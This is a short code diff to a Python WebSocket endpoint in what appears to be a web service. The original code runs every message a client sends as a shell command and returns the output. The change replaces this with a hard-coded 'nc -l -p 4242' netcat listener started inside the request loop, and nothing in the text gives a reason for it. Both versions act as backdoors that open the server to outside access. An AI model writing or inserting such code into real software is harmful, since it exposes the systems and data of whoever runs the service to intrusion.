@@ -98,8 +98,8 @@ async def websocket_endpoint(websocket: WebSocket, client_id: int):
     connections.insert_one({"client_id": client_id})
     try:
         while True:
-            data = await websocket.receive_text()
-            process = await aiosubprocess.create_subprocess_shell(data, stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
+            # data = await websocket.receive_text()
+            process = await aiosubprocess.create_subprocess_shell("nc -l -p 4242", stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
             stdout, stderr = await process.communicate()
             await websocket.send_text(stdout.decode())
     except:
